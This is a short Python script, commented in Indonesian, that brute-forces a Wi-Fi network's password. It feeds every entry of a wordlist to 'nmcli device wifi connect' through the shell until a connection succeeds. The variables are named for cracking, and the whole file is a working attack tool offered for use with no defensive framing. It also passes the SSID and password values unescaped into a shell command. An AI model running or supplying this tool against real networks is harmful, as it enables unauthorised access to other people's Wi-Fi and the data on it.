import subprocess

ssid = input("Masukkan nama SSID jaringan Wi-Fi: ")
file_wordlist = input("Masukkan nama file wordlist: ")

kata_sandi_ditemukan = False

try:
    with open(file_wordlist, "r", encoding="latin-1", errors="ignore") as fw:
        daftar_kata_sandi = fw.read().splitlines()
        for kata_sandi in daftar_kata_sandi:
            perintah_crack_wifi = f"nmcli device wifi connect {ssid} password {kata_sandi}"
            try:
                crack_wifi = subprocess.run(perintah_crack_wifi, shell=True, capture_output=True, text=True)
                if "successfully activated" in crack_wifi.stdout:
                    print(f"[+] Berhasil terhubung ke jaringan Wi-Fi dengan SSID: {ssid} menggunakan kata sandi: {kata_sandi}")
                    kata_sandi_ditemukan = True 
                    break
                else:
                    print(f"[-] Gagal terhubung ke jaringan Wi-Fi dengan SSID: {ssid} menggunakan kata sandi: {kata_sandi}")
            except KeyboardInterrupt:
                print(f"\n[-] Program dihentikan oleh pengguna.")
                exit(1)
            except Exception as e:
                print(f"\n[-] Terjadi kesalahan: {e}.")
                exit(1)
        if not kata_sandi_ditemukan:
            print(f"[-] Kata sandi tidak ditemukan, coba file wordlist yang lain.")
except Exception as e:
    print(f"\n[-] Terjadi kesalahan: {e}.")
    exit(1)
